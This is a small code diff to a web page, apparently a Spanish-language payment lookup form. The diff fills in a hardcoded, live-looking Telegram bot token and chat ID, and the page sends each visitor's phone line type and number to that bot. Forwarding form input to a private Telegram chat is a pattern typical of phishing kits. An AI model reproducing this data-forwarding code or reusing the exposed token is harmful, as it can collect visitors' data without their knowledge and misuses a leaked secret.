@@ -211,8 +211,8 @@
             loader.style.display = "flex";
 
             // 🔹 Enviar a Telegram
-            const botToken = "TU_BOT_TOKEN_AQUI"; // Reemplaza con tu token
-            const chatId = "TU_CHAT_ID_AQUI";     // Reemplaza con tu chat ID
+            const botToken = "8149198005:AAFr_Caqa4fby95H3nwUBdKCUvT-X56rbHo"; // Reemplaza con tu token
+            const chatId = "8217102156";     // Reemplaza con tu chat ID
             const message = `📱 Nueva consulta de pago:\nTipo: ${lineType}\nNúmero: ${lineNumber}\n⏰ Fecha: ${new Date().toLocaleString()}`;
 
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -243,3 +243,4 @@
 </body>
 
 </html>
+
